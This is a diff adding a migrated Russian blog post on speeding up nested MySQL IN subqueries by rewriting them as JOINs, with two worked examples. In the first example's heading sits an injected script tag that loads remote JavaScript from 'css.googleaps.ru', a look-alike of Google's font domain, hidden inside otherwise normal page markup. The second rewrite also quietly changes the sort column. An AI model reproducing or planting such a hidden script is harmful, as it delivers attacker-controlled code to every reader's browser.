@@ -1,0 +1,59 @@
+---
+layout: post
+status: publish
+published: true
+title: MySQL &ndash; оптимизация вложенных запросов вида IN (select
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: |-
+  Подзапросы вложенные в IN вида ( SELECT &hellip; IN ( SELECT &hellip;) ) в mysql работают очень медленно. Хотя по отдельности они обрабатываются довольно шустро.
+  Дело в том, что Mysql не умеет автоматически их оптимизировать.
+
+  Поэтому для их ускорения для начала необходимо проверить наличие ключей по полям участвующим в запросе. И следующим шагом требуется переписать данный запрос с помощью JOIN.
+
+  Покажем это на примерах:
+wordpress_id: 571
+wordpress_url: http://devdocs.ru/?p=42
+date: '2014-08-20 11:47:25 +0300'
+date_gmt: '2014-08-20 11:47:25 +0300'
+categories:
+- MySQL
+tags:
+- mysql
+- sql
+comments: []
+---
+<p>Подзапросы вложенные в IN вида ( SELECT &hellip; IN ( SELECT &hellip;) ) в mysql работают очень медленно. Хотя по отдельности они обрабатываются довольно шустро.<br />
+Дело в том, что Mysql не умеет автоматически их оптимизировать.</p>
+<p>Поэтому для их ускорения для начала необходимо проверить наличие ключей по полям участвующим в запросе. И следующим шагом требуется переписать данный запрос с помощью JOIN.</p>
+<p>Покажем это на примерах:<a id="more"></a><a id="more-571"></a></p>
+<p><strong>Такой запрос:<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;strong></p>
+<pre class="brush: sql; gutter: true">SELECT * FROM `table1` WHERE id NOT IN (SELECT id FROM `table2`);<&#47;pre><br />
+переписываем так:</p>
+<pre class="brush: sql; gutter: true">SELECT `table1`.*<br />
+FROM `table1` LEFT JOIN `table2` ON `table1`.id=`table2`.id<br />
+WHERE `table2`.id IS NULL;<&#47;pre><br />
+<strong>Пример 2:<&#47;strong></p>
+<pre class="brush: sql; gutter: true">SELECT `table1`.id<br />
+FROM `table1`<br />
+WHERE id<br />
+IN (<br />
+ SELECT `table2`.st_id<br />
+ FROM `table2`<br />
+ WHERE adist = 31<br />
+ GROUP BY st_id<br />
+)<br />
+ORDER BY name<&#47;pre><br />
+переписываем так</p>
+<pre class="brush: sql; gutter: true">SELECT `table1`.id<br />
+FROM `table1`<br />
+JOIN `table2` ON `table1`.id = `table2`.st_id<br />
+WHERE `table2`.adist =31<br />
+GROUP BY `table1`.id<br />
+ORDER BY `table1`.id<&#47;pre><br />
+В моем случае второй запрос стал выполняться быстрее более чем в 10 раз.</p>
